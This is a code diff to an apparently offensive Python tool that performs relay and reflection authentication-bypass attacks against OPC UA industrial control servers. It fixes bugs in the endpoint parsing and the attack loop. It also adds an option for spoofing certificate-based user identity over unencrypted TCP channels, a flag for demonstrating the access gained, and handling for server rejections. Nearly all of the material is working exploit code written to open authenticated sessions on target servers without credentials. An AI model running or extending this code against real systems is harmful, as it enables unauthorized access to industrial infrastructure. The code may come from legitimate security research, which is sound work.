@@ -6,7 +6,7 @@ from message_fields import *
 from typing import *
 from crypto import *
 from datetime import datetime
-from socket import socket, create_connection
+from socket import socket, create_connection, SHUT_RDWR
 from random import randint
 from enum import Enum, auto
 from binascii import unhexlify
@@ -37,7 +37,7 @@ def proto_scheme(protocol : TransportProtocol) -> str:
   }[protocol]
   
 def parse_endpoint_url(url):
-  m = re.match(r'(?P<scheme>[\w.]+)://(?P<host>[^:/]+):(?P<port>\d+)/', url)
+  m = re.match(r'(?P<scheme>[\w.]+)://(?P<host>[^:/]+):(?P<port>\d+)', url)
   if not m:
     raise Exception(f'Don\'t know how to process endpoint url: {url}')
   else:
@@ -199,7 +199,8 @@ def generic_exchange(
 # Request endpoint information from a server.
 def get_endpoints(ep_url : str) -> List[endpointDescription.Type]:
   if ep_url.startswith('opc.tcp://'):
-    with connect_and_hello(protocol, host, port) as sock:
+    _, host, port = parse_endpoint_url(ep_url)
+    with connect_and_hello(host, port) as sock:
       chan = unencrypted_opn(sock)
       resp = session_exchange(chan, getEndpointsRequest, getEndpointsResponse, 
         requestHeader=simple_requestheader(),
@@ -222,7 +223,8 @@ def get_endpoints(ep_url : str) -> List[endpointDescription.Type]:
 # Performs the relay attack. Channels can be either OPC sessions or HTTPS URLs.
 def execute_relay_attack(
     imp_chan : ChannelState | str, imp_endpoint : endpointDescription.Type,
-    login_chan : ChannelState | str, login_endpoint : endpointDescription.Type
+    login_chan : ChannelState | str, login_endpoint : endpointDescription.Type,
+    prefer_certauth : bool = False
   ) -> NodeId:
     def csr(chan, client_ep, server_ep, nonce):
       return generic_exchange(chan, server_ep.securityPolicyUri, createSessionRequest, createSessionResponse, 
@@ -249,7 +251,7 @@ def execute_relay_attack(
     # Make a token with an anonymous or certificate-based user identity policy.
     anon_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.ANONYMOUS]
     cert_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.CERTIFICATE]
-    if anon_policies:
+    if anon_policies and not (prefer_certauth and cert_policies):
       usertoken = anonymousIdentityToken.create(policyId=anon_policies[0].policyId)
       usersig = signatureData.create(algorithm=None,signature=None)
     elif cert_policies:
@@ -347,7 +349,7 @@ def demonstrate_access(chan : ChannelState | str, authToken : NodeId, policy : S
   log('Finished browsing.') 
 
 # Reflection attack: log in to a server with its own identity.
-def reflect_attack(url : str):
+def reflect_attack(url : str, demo : bool):
   proto, host, port = parse_endpoint_url(url)
   log(f'Attempting reflection attack against {url}')
   endpoints = get_endpoints(url)
@@ -363,48 +365,58 @@ def reflect_attack(url : str):
     log(f'Targeting {url} with {target.securityPolicyUri.name} security policy.')
     token = execute_relay_attack(url, target, url, target)
     log_success(f'Attack succesfull! Authenticated session set up with {url}.')
-    demonstrate_access(url, token, target.securityPolicyUri)
+    if demo:
+      demonstrate_access(url, token, target.securityPolicyUri)
   else:
     raise AttackNotPossible('TODO: implement combination with OPN attack.')
       
-def relay_attack(source_url : str, target_url : str):
+def relay_attack(source_url : str, target_url : str, demo : bool):
   log(f'Attempting relay from {source_url} to {target_url}')
   seps = get_endpoints(source_url)
-  log(f'Listed {len(seps)} endpoints from {a2url(source_url)}.')
+  log(f'Listed {len(seps)} endpoints from {source_url}.')
   teps = get_endpoints(target_url)
-  log(f'Listed {len(teps)} endpoints from {a2url(target_url)}.')
+  log(f'Listed {len(teps)} endpoints from {target_url}.')
   
   # Prioritize HTTPS targets with a non-NONE security policy.
-  sort(teps, key=lambda ep: [not ep.transportProfileUri.endswith('https-uabinary'), ep.securityPolicyUri == SecurityPolicy.NONE])
+  teps.sort(key=lambda ep: [not ep.transportProfileUri.endswith('https-uabinary'), ep.securityPolicyUri == SecurityPolicy.NONE])
   
   tmpsock = None
+  prefercert = False
   try:
     for sep, tep in itertools.product(seps, teps):
       # Source must be HTTPS and non-NONE.
-      if sep.transportProfileUri.endswith('https-uabinary') and spe.securityPolicyUri != SecurityPolicy.NONE:
+      if sep.transportProfileUri.endswith('https-uabinary') and sep.securityPolicyUri != SecurityPolicy.NONE:
         oraclechan = sep.endpointUrl
+        supports_usercert = any(p.tokenType == UserTokenType.CERTIFICATE for p in tep.userIdentityTokens)
         
         if tep.transportProfileUri.endswith('https-uabinary'):
           # HTTPS target.
           mainchan = tep.endpointUrl
-        elif tep.transportProfileUri.endswith('uatcp-uasc-uabinary') and tep.securityPolicyUri == SecurityPolicy.NONE:
+        elif tep.transportProfileUri.endswith('uatcp-uasc-uabinary') and tep.securityPolicyUri == SecurityPolicy.NONE and supports_usercert:
           # When only a TCP target is available we can still try to spoof a user cert.
           _, thost, tport = parse_endpoint_url(tep.endpointUrl)
           tmpsock = connect_and_hello(thost, tport)
           mainchan = unencrypted_opn(tmpsock)
+          prefercert = True
         else:
           continue
           
         log(f'Trying endpoints {sep.endpointUrl} ({sep.securityPolicyUri.name})-> {tep.endpointUrl} ({tep.securityPolicyUri.name})')
-        token = execute_relay_attack(oraclechan, sep, mainchan, tep)
+        token = execute_relay_attack(oraclechan, sep, mainchan, tep, prefercert)
         log_success(f'Attack succesfull! Authenticated session set up with {tep.endpointUrl}.')
-        demonstrate_access(mainchan, token, tep.securityPolicyUri)
+        if demo:
+          demonstrate_access(mainchan, token, tep.securityPolicyUri)
         return
     
     raise AttackNotPossible('TODO: implement combination with OPN attack.')
+  except ServerError as err:
+    if err.errorcode == 0x80550000 and target_url.startswith('opc.tcp'):
+      raise AttackNotPossible('Security policy rejected by server. Perhaps user authentication over NONE channel is blocked.')
+    else:
+      raise err
   finally:
     if tmpsock:
-      tmpsock.shutdown(socket.SHUT_RDWR)
+      tmpsock.shutdown(SHUT_RDWR)
       tmpsock.close()
       
 
@@ -450,7 +462,7 @@ def relay_attack(source_url : str, target_url : str):
 #       except:
 #         # On any misc. exception, assume the connection is broken and try again with a fresh socket.
 #         try:
-#           reuse_state.sock.shutdown(socket.SHUT_RDWR)
+#           reuse_state.sock.shutdown(SHUT_RDWR)
 #           reuse_state.sock.close()
 #         except:
 #           pass
